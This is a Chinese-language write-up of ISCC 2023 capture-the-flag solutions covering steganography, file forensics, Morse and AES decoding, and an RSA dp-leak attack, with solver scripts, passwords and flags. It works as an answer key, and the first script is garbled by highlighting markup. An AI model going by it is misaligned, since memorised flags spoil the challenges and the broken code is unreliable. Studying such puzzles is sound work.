<p><img src="https://img-blog.csdnimg.cn/2a80b7606cff4aa8bcd55aa51784c6a5.png#pic_center" alt="在这里插入图片描述"></p>
<h2 id="你相信AI吗？"><a href="#你相信AI吗？" class="headerlink" title="你相信AI吗？"></a>你相信AI吗？</h2><p>将dataset⽂件夹放在与以下这个脚本同⼀个⽂件夹的位置，然后创建⼀个out⽂件夹</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):
 <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;./dataset/<span class="hljs-subst">&#123;i&#125;</span>.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:
 data = f.read().splitlines()
 image_data = np.array([<span class="hljs-built_in">float</span>(line) <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> data])
 <span class="hljs-comment"># dic = &#123;X: int(image_data.shape[0] / X) for X in range(1, image_data.shape[0]) if</span>
image_data.shape[<span class="hljs-number">0</span>] % X <span class="hljs-string">&quot;# 0&#125;</span>
<span class="hljs-string"> # for width, height in dic.items():</span>
<span class="hljs-string"> if image_data.shape[0] &quot;</span><span class="hljs-comment"># 2352:</span>
 cv2.imwrite(<span class="hljs-string">f&quot;./out/<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>, image_data.reshape(<span class="hljs-number">84</span>, <span class="hljs-number">28</span>))
 <span class="hljs-keyword">elif</span> image_data.shape[<span class="hljs-number">0</span>] <span class="hljs-string">&quot;# 1568:</span>
<span class="hljs-string"> cv2.imwrite(f&quot;</span>./out/&#123;i&#125;.png<span class="hljs-string">&quot;, image_data.reshape(56, 28))</span>
<span class="hljs-string"> else:</span>
<span class="hljs-string"> print(i)</span></code></pre>
<p>执⾏完成之后将out⽂件夹中的图⽚中显示的数字按顺序写到cipher_text中以空格隔开</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> string
<span class="hljs-keyword">import</span> itertools
<span class="hljs-keyword">import</span> contextlib
<span class="hljs-keyword">def</span> <span class="hljs-title function_">has_visible_bytes</span>(<span class="hljs-params">input_bytes</span>):
 <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(<span class="hljs-built_in">chr</span>(byte) <span class="hljs-keyword">in</span> string.printable <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> input_bytes)
cipher_text = <span class="hljs-string">&#x27;51 59 75 95 56 46 669 665 59 57 685 73 56 55 685 53 77 685 75 664 25 682</span>
<span class="hljs-string">75 74 22 48 59 78 683 56 96 96&#x27;</span>.split(<span class="hljs-string">&quot; &quot;</span>)<span class="hljs-comment">#修改这个位置的值</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;out.txt&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:
 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(<span class="hljs-string">&quot;0123456789&quot;</span>, <span class="hljs-number">10</span>):
 maktrans = <span class="hljs-built_in">str</span>.maketrans(<span class="hljs-string">&quot;0123456789&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>.join(i))
 lis = [<span class="hljs-built_in">str</span>.translate(i, maktrans) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cipher_text]
 <span class="hljs-keyword">with</span> contextlib.suppress(Exception):
 plan_text = <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(x), lis)))
 <span class="hljs-keyword">if</span> has_visible_bytes(plan_text):
 <span class="hljs-built_in">print</span>(plan_text)
 f.write(plan_text + <span class="hljs-string">b&quot;\n&quot;</span>)</code></pre>

<h2 id="mystery-of-bits"><a href="#mystery-of-bits" class="headerlink" title="mystery of bits"></a>mystery of bits</h2><p>解压附件有一个key.png，用脚本跑出他的长宽</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii
<span class="hljs-keyword">import</span> struct
 
 
 
crcbp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()    <span class="hljs-comment">#打开图片</span>
crc32frombp = <span class="hljs-built_in">int</span>(crcbp[<span class="hljs-number">29</span>:<span class="hljs-number">33</span>].<span class="hljs-built_in">hex</span>(),<span class="hljs-number">16</span>)     <span class="hljs-comment">#读取图片中的CRC校验值</span>
<span class="hljs-built_in">print</span>(crc32frombp)
 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4000</span>):                        <span class="hljs-comment">#宽度1-4000进行枚举</span>
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4000</span>):                    <span class="hljs-comment">#高度1-4000进行枚举</span>
        data = crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + \
            struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]
        crc32 = binascii.crc32(data) &amp; <span class="hljs-number">0xffffffff</span>
        <span class="hljs-comment"># print(crc32)</span>
        <span class="hljs-keyword">if</span>(crc32 == crc32frombp):            <span class="hljs-comment">#计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定</span>
            <span class="hljs-built_in">print</span>(i, j)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hex:&#x27;</span>, <span class="hljs-built_in">hex</span>(i), <span class="hljs-built_in">hex</span>(j))
            exit(<span class="hljs-number">0</span>)
</code></pre>
<p>为0x438 0x438，修改图片后用stegslove打开<br><img src="https://img-blog.csdnimg.cn/49e1c873c86c42429383d6a2b567079b.png" alt="在这里插入图片描述"><br>找到这个横着看能看出密码是ysafao245hfdisi解压后是一个wav音频文件，用010打开在最后有password为ISCC2023，再用stegpy解密能解出一堆二进制，0000000000000000000000000000000011111110101010111111101111111001000001011101011100000100000100101110101111000111110010111010010111010101000000101001011101001011101010110100101000101110100100000100010110000001010000010011111110101010101010101111111000000000010011001101000000000000010101101010101010111110111110011110000111111100010100101110000010111010010110110101101111000011100000011100000111000001110001001011101001011010010110100000000110100000111000001110000000001011101001011010010110100100010001101001100111011101010100001010011111010110011101001111100000011001100100001101100101000010100010011000010000011000100001011100001011001110110110100100101011100111110101111111101100000000000100001010110100010001001111111001000110010010101010000100000101101111001001000111110010111010011101110101111110101001011101010111011001101110101000101110100010111010101110111010010000010110011001000110011110001111111000010001000010010100000000000000000000000000000000000然后将这些转换成一个长宽为31的二维码</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
<span class="hljs-keyword">from</span> zlib <span class="hljs-keyword">import</span> *

MAX = <span class="hljs-number">31</span> <span class="hljs-comment"># 数字的长度为一个整数的平方（如36^2=1296)</span>
pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX,MAX))
<span class="hljs-built_in">str</span> =<span class="hljs-string">&quot;0000000000000000000000000000000011111110101010111111101111111001000001011101011100000100000100101110101111000111110010111010010111010101000000101001011101001011101010110100101000101110100100000100010110000001010000010011111110101010101010101111111000000000010011001101000000000000010101101010101010111110111110011110000111111100010100101110000010111010010110110101101111000011100000011100000111000001110001001011101001011010010110100000000110100000111000001110000000001011101001011010010110100100010001101001100111011101010100001010011111010110011101001111100000011001100100001101100101000010100010011000010000011000100001011100001011001110110110100100101011100111110101111111101100000000000100001010110100010001001111111001000110010010101010000100000101101111001001000111110010111010011101110101111110101001011101010111011001101110101000101110100010111010101110111010010000010110011001000110011110001111111000010001000010010100000000000000000000000000000000000&quot;</span>

i=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,MAX):
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,MAX):
        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):
            pic.putpixel([x,y],(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))
        <span class="hljs-keyword">else</span>:pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))
        i = i+<span class="hljs-number">1</span>
pic.show()
pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)
</code></pre>
<p>扫码即为flag</p>
<h2 id="通信方式"><a href="#通信方式" class="headerlink" title="通信方式"></a>通信方式</h2><p>打开附件，是一段音频文件，猜测其中有二进制数据，写个脚本解题</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> scipy.io <span class="hljs-keyword">import</span> wavfile
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
sample_rate, data = wavfile.read(<span class="hljs-string">&#x27;telegram2wechat.wav&#x27;</span>)
left_channel = data[:, <span class="hljs-number">0</span>]
right_channel = data[:, <span class="hljs-number">1</span>]
result = left_channel - right_channel
np.savetxt(<span class="hljs-string">&#x27;array.txt&#x27;</span>,result,fmt=<span class="hljs-string">&#x27;%d&#x27;</span>)
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;array.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:
    file_contents = file.readlines()
file_contents = [<span class="hljs-built_in">int</span>(line.strip()) <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file_contents]
flag = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> file_contents <span class="hljs-keyword">if</span> x != <span class="hljs-number">0</span>]
flag_new = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> flag:
    flag_new += <span class="hljs-built_in">str</span>(t)
flag_new = flag_new.replace(<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>)
<span class="hljs-built_in">print</span>(flag_new)
MAX = <span class="hljs-number">45</span>
pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX,MAX))
i=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,MAX):
   <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,MAX):
        <span class="hljs-keyword">if</span>(flag_new[i] == <span class="hljs-string">&#x27;1&#x27;</span>):
            pic.putpixel([x,y],(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))
        <span class="hljs-keyword">else</span>:pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))
        i = i+<span class="hljs-number">1</span>
pic.show()
pic.save(<span class="hljs-string">&quot;flag&quot;</span>)</code></pre>
<p>跑出二维码扫描后得到一堆电码，去在线网站解密<br><img src="https://img-blog.csdnimg.cn/a16e68f154c94065aa93bece285d2db7.png" alt="在这里插入图片描述"><br>挨个读出来得到flag</p>
<h2 id="芝士雪豹"><a href="#芝士雪豹" class="headerlink" title="芝士雪豹"></a>芝士雪豹</h2><p>打开附件，发现附件无法正常打开，先把附件拖进010里看看，发现rar的文件头74被改成了73，把期中的rar文件头先修改回来<br><img src="https://img-blog.csdnimg.cn/e8381e7ea9614e219d2ff37cd8f80808.png" alt="在这里插入图片描述"><br>打开压缩包是一张图片和一个带有加密的压缩包，先修改图片高度，得到了压缩包的密码<br><img src="https://img-blog.csdnimg.cn/65a196b1f55840b9aa931be6e6b5de16.png" alt="在这里插入图片描述"><br>打开压缩包，发现是个套娃，利用python脚本跑出最后一个压缩包<br><img src="https://img-blog.csdnimg.cn/b8cc1c336b33427489fd636356d69232.png" alt="在这里插入图片描述"><br>压缩完后只看见一个0.txt文档，里面写着“hint:something fell on the road,the flag is not at the end ”，再结合一开始的hint证明，flag不是简单压缩完就能得到的。通过观察，发现压缩包的修改日期不同，有两种修改日期。<br><img src="https://img-blog.csdnimg.cn/ee557d326fc14ab7a188521da119012e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/58fbba62fb6e470bb1cd0ad4c654d58e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/9333e0d465374a308a43c3a4b7a47d5d.png" alt="在这里插入图片描述"><br>把“2023-05-01 10:13:52”看作“0”，把“2023-05-01 10:13:58”看作“1”，猜测其为二进制加密<br>写python脚本</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile
<span class="hljs-keyword">import</span> os.path, time
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> pyzipper


<span class="hljs-keyword">def</span> <span class="hljs-title function_">TimeStampToTime</span>(<span class="hljs-params">timestamp</span>):
    timeStruct = time.localtime(timestamp)
    <span class="hljs-keyword">return</span> time.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, timeStruct)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_FileCreateTime</span>(<span class="hljs-params">filePath</span>):
    <span class="hljs-comment"># &#x27;&#x27;&#x27;获取文件的创建时间&#x27;&#x27;&#x27;</span>
    <span class="hljs-comment"># filePath = unicode(filePath,&#x27;utf8&#x27;)</span>
    t = os.path.getctime(filePath)
    <span class="hljs-keyword">return</span> TimeStampToTime(t)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_FileModifyTime</span>(<span class="hljs-params">filePath</span>):
    <span class="hljs-comment"># &#x27;&#x27;&#x27;获取文件的修改时间&#x27;&#x27;&#x27;</span>
    <span class="hljs-comment"># filePath = unicode(filePath, &#x27;utf8&#x27;)</span>
    t = os.path.getmtime(filePath)
    <span class="hljs-keyword">return</span> TimeStampToTime(t)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_FileAccessTime</span>(<span class="hljs-params">filePath</span>):
    <span class="hljs-comment"># &#x27;&#x27;&#x27;获取文件的访问时间&#x27;&#x27;&#x27;</span>
    <span class="hljs-comment"># filePath = unicode(filePath, &#x27;utf8&#x27;)</span>
    t = os.path.getatime(filePath)
    <span class="hljs-keyword">return</span> TimeStampToTime(t)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_FileSize</span>(<span class="hljs-params">filePath</span>):
    <span class="hljs-comment"># &#x27;&#x27;&#x27;获取文件的大小,结果保留两位小数，单位为MB&#x27;&#x27;&#x27;</span>
    <span class="hljs-comment"># filePath = unicode(filePath,&#x27;utf8&#x27;)</span>
    fsize = os.path.getsize(filePath)
    fsize = fsize / <span class="hljs-built_in">float</span>(<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">round</span>(fsize, <span class="hljs-number">2</span>)
name = <span class="hljs-string">&#x27;49183-secret.zip&#x27;</span>
num=<span class="hljs-number">49183</span>
out=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)
<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
      fz = zipfile.ZipFile(name)
      fz.extractall()
      <span class="hljs-keyword">for</span> zi <span class="hljs-keyword">in</span> fz.infolist():
          fz.extract(zi)
          date_time = time.mktime(zi.date_time + (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>))
          os.utime(zi.filename, (date_time, date_time))
          m=get_FileModifyTime(zi.filename)
          <span class="hljs-built_in">print</span>(m)
      fz.close()
      <span class="hljs-keyword">if</span> m==<span class="hljs-string">&#x27;2023-05-01 10:13:52&#x27;</span>:
         out.write(<span class="hljs-string">&#x27;0&#x27;</span>)
      <span class="hljs-keyword">else</span>:
         out.write(<span class="hljs-string">&#x27;1&#x27;</span>)
      num=num-<span class="hljs-number">1</span>
      path=name
      name = <span class="hljs-built_in">str</span>(num)+<span class="hljs-string">&#x27;-secret.zip&#x27;</span>
      fz.close()
      os.remove(path)
</code></pre>

<p>跑完后得到一堆2进制数据，去在线网址上，将2进制转换为16进制文件。<br><img src="https://img-blog.csdnimg.cn/45ae78d425fc4150936acf6cd7b1de14.png" alt="在这里插入图片描述"><br>将文件导出后，拖进010查看格式，发现是gz格式文件头，解压后得到一个图片<br><img src="https://img-blog.csdnimg.cn/b21c47031a59462fba7e07458bd2e733.png" alt="在这里插入图片描述"><br>使用imageIN解密得到flag.txt文档<br><img src="https://img-blog.csdnimg.cn/8c8575d869b94bee8ff3bb1461ca5edb.png" alt="在这里插入图片描述"><br>去在线解密网站解密得到flag<br><img src="https://img-blog.csdnimg.cn/f93e6c96f335490d87ed623d9f1971e3.png" alt="在这里插入图片描述"></p>
<h2 id="哦？摩斯密码？"><a href="#哦？摩斯密码？" class="headerlink" title="哦？摩斯密码？"></a>哦？摩斯密码？</h2><p>打开附件，发现每个文件夹里有三个二维码，扫描后是摩斯密码，利用脚本扫描所有摩斯密码<br><img src="https://img-blog.csdnimg.cn/26e2f27fbb0c4e5387e7d3781044e5b5.png" alt="在这里插入图片描述"><br>将扫出来的结果字频统计一下<br><img src="https://img-blog.csdnimg.cn/1d68f377916a41c4b9ec6f2257362125.png" alt="在这里插入图片描述"><br>得到明文“this is no flag”,观察所有flag的图片是相同的，但是图片的名字不同，有1.png、2.png和3.png，根据题目联想到摩斯密码，讲1.png看成. ，2.png看成-，3.png看成分割，写出脚本跑出摩斯密码<br><img src="https://img-blog.csdnimg.cn/15c70f4eda0c4f4bb1217f50cda8a178.png" alt="在这里插入图片描述"><br>将跑出的摩斯密码去网站在线解密后，得到二进制数据<br><img src="https://img-blog.csdnimg.cn/3038c21cd921488aacb916317f0e8383.png" alt="在这里插入图片描述"><br>7位二进制得到密文<br><img src="https://img-blog.csdnimg.cn/ad36f5d1af454aa98c3dca3f0e8d3ce0.png" alt="在这里插入图片描述"><br>去AES解密在线网站，输入密码“th1sn0flag”解密，得到flag<br><img src="https://img-blog.csdnimg.cn/d64d5d7b2c2e441494cf40fce4317464.png" alt="在这里插入图片描述"></p>
<h2 id="Brain-Game"><a href="#Brain-Game" class="headerlink" title="Brain Game"></a>Brain Game</h2><p>下载附件是个用AAencode加密的压缩包，密码在压缩包右边，把？改为 ﾟ 后得到密码<br>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //<em>´∇｀</em>/ [‘<em>‘]; o=(ﾟｰﾟ)  =</em>=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^<em>^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: ‘</em>‘ ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +’<em>‘) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ ‘</em>‘)[o^<em>^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +’</em>‘)[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +’<em>‘) [c^_^o];(ﾟДﾟ) [‘c’] = ((ﾟДﾟ)+’</em>‘) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [‘o’] = ((ﾟДﾟ)+’<em>‘) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [‘c’]+(ﾟДﾟ) [‘o’]+(ﾟωﾟﾉ +’</em>‘)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +’<em>‘) [ﾟｰﾟ] + ((ﾟДﾟ) +’</em>‘) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +’<em>‘) [ﾟΘﾟ]+((ﾟｰﾟ==3) +’</em>‘) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [‘c’]+((ﾟДﾟ)+’<em>‘) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [‘o’]+((ﾟｰﾟ==3) +’</em>‘) [ﾟΘﾟ];(ﾟДﾟ) [‘<em>‘] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +’</em>‘) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+’<em>‘) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +’</em>‘) [o^<em>^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +’</em>‘) [ﾟΘﾟ]+ (ﾟωﾟﾉ +’<em>‘) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=’\‘; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +’</em>‘)[c^<em>^o];(ﾟДﾟ) [ﾟoﾟ]=’&quot;‘;(ﾟДﾟ) [‘</em>‘] ( (ﾟДﾟ) [‘<em>‘] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (‘</em>‘);</p>
<p>打开压缩包后，是一张图片<br><img src="https://img-blog.csdnimg.cn/8bcc851d4b024a60bae9ec76ab06b205.png" alt="在这里插入图片描述"><br>根据碎裂痕迹，对应到键盘上为“135780”，先用“135780”，cloacked-pixel解密，解不出来有用数据，密码不正确，再看图片，如果按照裂痕先后的思路，后出现的裂痕会在碰到前面出现的裂痕后停止，得到顺序“570831”，再去cloacked-pixel解密<br><img src="https://img-blog.csdnimg.cn/0bb19682ff194f0c89341f4bb87c7886.png" alt="在这里插入图片描述"><br>得到一段数据，经过尝试后，发现先form hex 再to base85就能得到flag<br><img src="https://img-blog.csdnimg.cn/0474675dfd5243998b4d5da7d851507c.png" alt="在这里插入图片描述"></p>
<h2 id="Guess-RSA"><a href="#Guess-RSA" class="headerlink" title="Guess RSA"></a>Guess RSA</h2><p>附件给了公钥，先脚本解出n和e</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA
<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP
<span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> long

public = RSA.importKey(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;pub&#x27;</span>).read())
n = long(public.n)
e = long(public.e)
<span class="hljs-built_in">print</span>(n)
<span class="hljs-built_in">print</span>(e)

n= <span class="hljs-number">141290037064947566206529132717181370698234864868642699047557973411457219735533077057541763794458453776854205535054584663279827865601322416203933147042933586981716703290143924844104156938834839095947246954751648421206411462640039984758358072222401824528712347742351563547663982933462992608020341150998418481469</span>
e= <span class="hljs-number">65537</span></code></pre>
<p>再将附件给的三个明文换成进制</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2
<span class="hljs-keyword">import</span> libnum

<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;cryptotext3.txt&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f1:
    c1 = f1.read()
    c1 = libnum.s2n(c1)
<span class="hljs-built_in">print</span>(c1)</code></pre>
<p>得到数据:<br>c1= 15675664162517005241985334850747322279876279456574700862907552681481377133185544579989247038799479171776327240780404882118904537725766312056443466295064750703372005792416973033030771437551025381553764003235556081094078622478104365189796833112914604071350200351731894133093904945300457608647456120613115797620<br>c2= 140861103274216455230721845501898308648236818144495265653434927079070691530723508171403973717514275151780171294904394774518093215002953258888100585054189890096052341414700257111375220034066504715553430076834975116291241799793991901777387974579764040747570218791785702867501258811622798523769676652686058178795<br>c3= 99529796079917923667416703621596340605976154418748680997166709360261843180294998507573349072387930043122958288285449187996957718834900637362680133270163491814007472682256839243994660305780477877832077377778094226956503797223980753581850455217835856249465622909655714810911375056415139213238490343537769816334</p>
<p>图片的pic.png使用zsteg发现16进制，把它看作dp，转换一下得到<br>Dp=<br>0x381044a04c6c66078e89668fd73cb82c4f10161be4c6f3a12781698d00efba838cdb4b4373bd72ebdca49a6470e59f9fb8413a3b2ac7ac850f176c4d65ef7ab5</p>
<p>已知n、e、c、dp，利用软件依次解出3个明文<br><img src="https://img-blog.csdnimg.cn/30dadcd55aff47cca9135ee209be2d24.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/40c8645146d7431cb1e0aceb18958a03.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0d2af007403f4be29a9fe47967167cbe.png" alt="在这里插入图片描述"><br>拼接三个flag部分得到flag：ISCC{iu5a!ui<em>3qehbca@90&amp;rhic+hj69at8v</em>r346z9(byawa5t0vr35-vr^if89%hu}</p>
<h2 id="听你心跳里的狂"><a href="#听你心跳里的狂" class="headerlink" title="听你心跳里的狂"></a>听你心跳里的狂</h2><p>下载附件，利用veracrypt，将音频文件作为秘钥文件挂载<br>打开磁盘得到一个加密的压缩包，用010打开，发现文件尾，有32字节字符<br><img src="https://img-blog.csdnimg.cn/477d75aa69cb4810ba5f332196014979.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ed2c6a580fce4c6990960c479fe66b77.png" alt="在这里插入图片描述"><br>利用rot13和rot47，解出一串md5字符串<br>在网站中解出压缩包的密码为 Logistic<br>解得png文件，但文件结构不对，无法打开，16进制为乱码。将文件头与png文件头逐字节异或发现得到都是0x15，将整个文件与0x15异或得到原png文件<br><img src="https://img-blog.csdnimg.cn/e7ac33705ac84076ad144d8014bfd287.png" alt="在这里插入图片描述"><br>将图片反色后，隐约在左上角看见flag的字样<br><img src="https://img-blog.csdnimg.cn/c1eab5c88c6c41c49de1d703e9f7ae10.png" alt="在这里插入图片描述"><br>经过不断的尝试，和硬看，终于得到flag，flag为：ISCC{GQQ_w4nt_eAt_f1sh !!}</p>
<h2 id="G9的钢琴曲"><a href="#G9的钢琴曲" class="headerlink" title="G9的钢琴曲"></a>G9的钢琴曲</h2><p>打开附件，发现是一道做过的密码题，把之前的脚本改改，解出密码。<br><img src="https://img-blog.csdnimg.cn/15737b664fdb49b5a5c66b14707a5cb6.png" alt="在这里插入图片描述"><br>解出密码 ISCC_Y0u_R3alLy_KnOw_CoPPersm1th， 打开文件后，是一个hint文件和一个压缩包<br>使用命令进行Cloakify解密，得到一个wav文件<br><img src="https://img-blog.csdnimg.cn/100b96b306094a13a782078fb2736d0b.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f8ace86ac2124c71ae2c89cdd10d6455.png" alt="在这里插入图片描述"><br>用010打开后发现有明显的二进制数据迹象，利用python脚本把- +，改为0和1得到二进制数据<br><img src="https://img-blog.csdnimg.cn/7de01cbb28e546fba7b5dc38442d221d.png" alt="在这里插入图片描述"><br>再解密这些二进制数据，即可得到flag</p>
